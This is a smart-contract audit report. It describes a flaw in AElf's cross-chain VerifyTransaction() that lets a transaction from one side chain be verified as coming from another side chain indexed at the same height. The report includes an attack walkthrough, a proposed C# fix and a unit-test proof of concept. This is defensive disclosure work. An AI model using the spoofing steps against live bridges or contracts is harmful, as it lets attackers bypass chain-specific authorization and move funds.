# Audit Report

## Title
Side Chain ID Spoofing in Cross-Chain Transaction Verification

## Summary
The `VerifyTransaction()` function fails to enforce that the provided `VerifiedChainId` parameter actually matches the source chain of a transaction. When multiple side chains are indexed at the same parent chain height, the function returns the same combined merkle root for all side chains, allowing an attacker to successfully verify a transaction from Chain A while falsely claiming it originated from Chain B.

## Finding Description

The vulnerability exists in the cross-chain transaction verification flow where the `VerifiedChainId` parameter is not properly validated against the actual transaction source.

**Entry Point:** The `VerifyTransaction()` function accepts a `VerifiedChainId` parameter but uses it only to determine the verification path (parent/side/cousin chain), not to filter which chain's data is actually verified. [1](#0-0) 

**Root Cause:** The `GetMerkleTreeRoot()` function checks if the provided chainId is a valid side chain, but when calling `GetSideChainMerkleTreeRoot()`, it does NOT pass the chain ID to filter the merkle root computation. [2](#0-1) 

**Critical Flaw:** The `GetSideChainMerkleTreeRoot()` function only accepts a `parentChainHeight` parameter and computes a combined merkle root from ALL side chains indexed at that height without any chain-specific filtering. [3](#0-2) 

**Storage Design:** Multiple side chains' data is aggregated together when they are indexed via `ReleaseCrossChainIndexingProposal()`, storing all chains indexed in the same transaction at the same height in a single `IndexedSideChainBlockData` entry. [4](#0-3) 

**Why Existing Checks Fail:** The only validation is `State.SideChainInfo[chainId] != null` which confirms the chain ID is registered, but doesn't prevent using the wrong chain ID for verification. [5](#0-4) 

**Attack Scenario:**
1. Two side chains (A and B) are indexed together at parent chain height H via `ReleaseCrossChainIndexingProposal(ChainIdList: [A, B])`
2. A transaction TX executes on Chain A
3. Attacker obtains the merkle path for TX on Chain A
4. Attacker calls `VerifyTransaction(TX, path, H, VerifiedChainId: B)` claiming TX is from Chain B
5. `GetMerkleTreeRoot(B, H)` returns the combined merkle root (same for all chains at height H)
6. The merkle path from Chain A still validates against this combined root
7. Verification succeeds despite the false chain ID claim

## Impact Explanation

**Cross-Chain Security Invariant Broken:** The fundamental assumption that `VerifyTransaction()` validates a transaction came from a SPECIFIC chain is violated. Any transaction from any side chain indexed together can be verified as coming from any other side chain indexed at the same height.

**Dependent Contract Exploitation:** Contracts that call `VerifyTransaction()` to implement chain-specific authorization (e.g., "only accept operations from trusted Chain A") can be completely bypassed. An attacker can execute operations on untrusted Chain B but verify them as coming from trusted Chain A.

**Real-World Impact Example:** If a bridge contract restricts token withdrawals to only transactions verified from a specific high-security side chain, an attacker could execute transactions on a less secure side chain but claim they're from the secure chain, bypassing security controls.

**Severity: HIGH** because:
- Breaks core cross-chain security guarantee
- Exploitable whenever multiple side chains are indexed together (common operation)
- Requires no special permissions
- Enables downstream attacks on any contract relying on source chain validation

## Likelihood Explanation

**Highly Likely to be Exploitable:**

**Reachable Entry Point:** `VerifyTransaction()` is a public view method with no access restrictions. [6](#0-5) 

**Attacker Capabilities:** 
- Execute normal transactions on any registered side chain (standard user capability)
- Obtain merkle paths via public side chain APIs
- Call `VerifyTransaction()` with any chain ID claim (no validation)

**Attack Complexity: LOW**
1. Send transaction on Side Chain A (normal user operation)
2. Retrieve merkle path from Chain A's API
3. Get parent chain height from Chain A's indexing data
4. Call `VerifyTransaction` with `VerifiedChainId = B` instead of A
5. Verification succeeds with same combined merkle root

**Preconditions:**
- Multiple side chains indexed at same height (occurs when miners call `ReleaseCrossChainIndexingProposal` with multiple chain IDs in `ChainIdList`)
- All provided chain IDs must be valid registered side chains

**No Barriers:**
- No trusted role required
- No economic cost beyond normal transaction fees
- No detection possible (verification succeeds through normal code paths)

## Recommendation

**Fix:** Modify `GetSideChainMerkleTreeRoot()` to accept and filter by the specific chain ID:

```csharp
private Hash GetSideChainMerkleTreeRoot(int chainId, long parentChainHeight)
{
    var indexedSideChainData = State.IndexedSideChainBlockData[parentChainHeight];
    
    // Filter to only the specified chain's data
    var chainSpecificData = indexedSideChainData.SideChainBlockDataList
        .Where(d => d.ChainId == chainId)
        .ToList();
    
    if (chainSpecificData.Count == 0)
        return null;
    
    return ComputeRootWithMultiHash(
        chainSpecificData.Select(d => d.TransactionStatusMerkleTreeRoot));
}
```

Update `GetMerkleTreeRoot()` to pass the chain ID:
```csharp
private Hash GetMerkleTreeRoot(int chainId, long parentChainHeight)
{
    if (chainId == State.ParentChainId.Value)
        return GetParentChainMerkleTreeRoot(parentChainHeight);

    if (State.SideChainInfo[chainId] != null)
        return GetSideChainMerkleTreeRoot(chainId, parentChainHeight); // Pass chainId

    return GetCousinChainMerkleTreeRoot(parentChainHeight);
}
```

## Proof of Concept

```csharp
[Fact]
public async Task SideChainIdSpoofing_Vulnerability_Test()
{
    // Setup: Create two side chains
    var parentChainId = 123;
    var lockedToken = 10;
    long parentChainHeightOfCreation = 10;
    var chainA = await InitAndCreateSideChainAsync(parentChainHeightOfCreation, parentChainId, lockedToken);
    var chainB = await CreateSideChainByDefaultSenderAsync(false, parentChainHeightOfCreation, parentChainId, lockedToken);

    // Create transaction data for Chain A
    var txInChainA = HashHelper.ComputeFrom("txInChainA");
    var txStatusHash = HashHelper.ComputeFrom(
        ByteArrayHelper.ConcatArrays(txInChainA.ToByteArray(),
        EncodingHelper.EncodeUtf8(TransactionResultStatus.Mined.ToString())));
    var chainAMerkleTree = BinaryMerkleTree.FromLeafNodes(new[] { txStatusHash });
    var chainARoot = chainAMerkleTree.Root;

    // Create Chain B data
    var chainBRoot = HashHelper.ComputeFrom("chainBRoot");

    // Index BOTH chains at the same height
    var blockDataA = CreateSideChainBlockData(HashHelper.ComputeFrom("blockA"), 1, chainA, chainARoot);
    var blockDataB = CreateSideChainBlockData(HashHelper.ComputeFrom("blockB"), 1, chainB, chainBRoot);
    
    var crossChainBlockData = new CrossChainBlockData
    {
        SideChainBlockDataList = { blockDataA, blockDataB }
    };
    
    var indexHeight = await DoIndexAsync(crossChainBlockData, new[] { chainA, chainB });

    // Get merkle path for transaction in Chain A
    var merklePath = chainAMerkleTree.GenerateMerklePath(0);
    merklePath.MerklePathNodes.Add(new MerklePathNode
    {
        Hash = chainARoot,
        IsLeftChildNode = true
    });

    // Verify with correct chain ID (Chain A) - should succeed
    var verifyWithCorrectChainId = await CrossChainContractStub.VerifyTransaction.CallAsync(
        new VerifyTransactionInput
        {
            TransactionId = txInChainA,
            ParentChainHeight = indexHeight,
            Path = merklePath,
            VerifiedChainId = chainA
        });
    verifyWithCorrectChainId.Value.ShouldBeTrue();

    // EXPLOIT: Verify same transaction claiming it's from Chain B - should fail but SUCCEEDS
    var verifyWithWrongChainId = await CrossChainContractStub.VerifyTransaction.CallAsync(
        new VerifyTransactionInput
        {
            TransactionId = txInChainA,
            ParentChainHeight = indexHeight,
            Path = merklePath,
            VerifiedChainId = chainB  // WRONG CHAIN ID
        });
    
    // Vulnerability: This should be false but is true
    verifyWithWrongChainId.Value.ShouldBeTrue();  // Demonstrates the vulnerability
}
```

## Notes

The vulnerability allows mis-attributing transactions between side chains indexed at the same height. While the attacker cannot forge transactions (merkle paths must still be valid), they can claim a real transaction from Chain A actually came from Chain B. This breaks semantic guarantees that contracts may depend on for authorization logic. The fix requires filtering merkle root computation by the specific chain ID to ensure verification actually validates the claimed source chain.

### Citations

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_View.cs (L37-46)
```csharp
    public override BoolValue VerifyTransaction(VerifyTransactionInput input)
    {
        var parentChainHeight = input.ParentChainHeight;
        var merkleTreeRoot = GetMerkleTreeRoot(input.VerifiedChainId, parentChainHeight);
        Assert(merkleTreeRoot != null,
            $"Parent chain block at height {parentChainHeight} is not recorded.");
        var rootCalculated = ComputeRootWithTransactionStatusMerklePath(input.TransactionId, input.Path);

        return new BoolValue { Value = merkleTreeRoot == rootCalculated };
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L241-246)
```csharp
    private Hash GetSideChainMerkleTreeRoot(long parentChainHeight)
    {
        var indexedSideChainData = State.IndexedSideChainBlockData[parentChainHeight];
        return ComputeRootWithMultiHash(
            indexedSideChainData.SideChainBlockDataList.Select(d => d.TransactionStatusMerkleTreeRoot));
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L253-264)
```csharp
    private Hash GetMerkleTreeRoot(int chainId, long parentChainHeight)
    {
        if (chainId == State.ParentChainId.Value)
            // it is parent chain
            return GetParentChainMerkleTreeRoot(parentChainHeight);

        if (State.SideChainInfo[chainId] != null)
            // it is child chain
            return GetSideChainMerkleTreeRoot(parentChainHeight);

        return GetCousinChainMerkleTreeRoot(parentChainHeight);
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L309-336)
```csharp
    private void RecordCrossChainData(IEnumerable<int> chainIdList)
    {
        var indexedSideChainBlockData = new IndexedSideChainBlockData();
        foreach (var chainId in chainIdList)
        {
            var pendingProposalExists = TryGetIndexingProposalWithStatus(chainId,
                CrossChainIndexingProposalStatus.Pending,
                out var pendingCrossChainIndexingProposal);
            Assert(pendingProposalExists, "Chain indexing not proposed.");

            if (chainId == State.ParentChainId.Value)
                IndexParentChainBlockData(pendingCrossChainIndexingProposal.ProposedCrossChainBlockData
                    .ParentChainBlockDataList);
            else
                indexedSideChainBlockData.SideChainBlockDataList.Add(IndexSideChainBlockData(
                    pendingCrossChainIndexingProposal.ProposedCrossChainBlockData.SideChainBlockDataList,
                    pendingCrossChainIndexingProposal.Proposer, chainId));

            SetCrossChainIndexingProposalStatus(pendingCrossChainIndexingProposal,
                CrossChainIndexingProposalStatus.Accepted);
        }

        if (indexedSideChainBlockData.SideChainBlockDataList.Count > 0)
        {
            State.IndexedSideChainBlockData.Set(Context.CurrentHeight, indexedSideChainBlockData);
            Context.Fire(new SideChainBlockDataIndexed());
        }
    }
```

**File:** protobuf/acs7.proto (L56-58)
```text
    rpc VerifyTransaction (VerifyTransactionInput) returns (google.protobuf.BoolValue) {
        option (aelf.is_view) = true;
    }
```
